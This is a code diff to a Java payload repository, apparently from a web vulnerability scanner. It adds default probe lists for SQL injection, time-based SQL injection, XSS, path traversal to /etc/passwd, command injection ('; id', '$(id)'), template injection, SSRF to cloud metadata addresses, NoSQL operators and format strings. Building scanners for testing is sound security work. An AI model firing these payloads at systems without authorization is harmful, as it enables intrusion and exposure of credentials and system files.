@@ -49,4 +49,49 @@ public class PayloadRepository {
         "....//....//....//....//etc//passwd",
         "/%5C../%5C../%5C../%5C../etc/passwd"
     );
+
+    // --- Seed defaults for ParamValidator config-driven payload lists ---
+    // LIGHT depth uses index 0, so each list is ordered "safety then signal":
+    // cheapest syntax/error probe first, louder boolean/union/evasion payloads later.
+
+    public static final String SQLI_DEFAULT =
+        "'\n" +
+        "' OR '1'='1\n" +
+        "1' ORDER BY 1--\n" +
+        "' UNION SELECT NULL--\n" +
+        "admin' --";
+
+    // XSS_POLYGLOT[0] is a noisy polyglot, so prepend a cheap reflection probe
+    // here rather than reordering the shared XSS_POLYGLOT list.
+    public static final String XSS_DEFAULT =
+        "<x>ICARUSXSS</x>\n" + String.join("\n", XSS_POLYGLOT);
+
+    public static final String PATH_TRAVERSAL_DEFAULT = String.join("\n", PATH_TRAVERSAL);
+
+    // SQLI_TIME's last element embeds literal \n (3 payloads in one string);
+    // String.join flattens it so split("\\R") yields clean single-line entries.
+    public static final String SQLI_TIME_DEFAULT = String.join("\n", SQLI_TIME);
+
+    // Numeric / unquoted context only. First line matches the module's current
+    // number-branch fallback literal so existing behaviour is preserved.
+    public static final String SQLI_TIME_NUMBER_DEFAULT =
+        "1-(WAITFOR DELAY '0:0:10')\n" +
+        "1 AND SLEEP(10)--\n" +
+        "1; SELECT pg_sleep(10)--";
+
+    public static final String CMDI_DEFAULT = "; id\n| whoami\n`id`\n$(id)";
+
+    public static final String SSTI_DEFAULT = "${7*7}\n{{7*7}}\n#{7*7}\n<%= 7*7 %>";
+
+    public static final String SSRF_HEURISTIC_DEFAULT =
+        "http://169.254.169.254/latest/meta-data/\n" +
+        "http://169.254.169.254/computeMetadata/v1/\n" +
+        "http://127.0.0.1/\n" +
+        "http://localhost/";
+
+    public static final String NOSQLI_DEFAULT = "{\"$ne\": null}\n{\"$gt\": \"\"}";
+
+    public static final String FORMAT_STRING_DEFAULT = "%s%x%n\n%p%p%p";
+
+    public static final String UNICODE_DEFAULT = "‮test😀";
 }
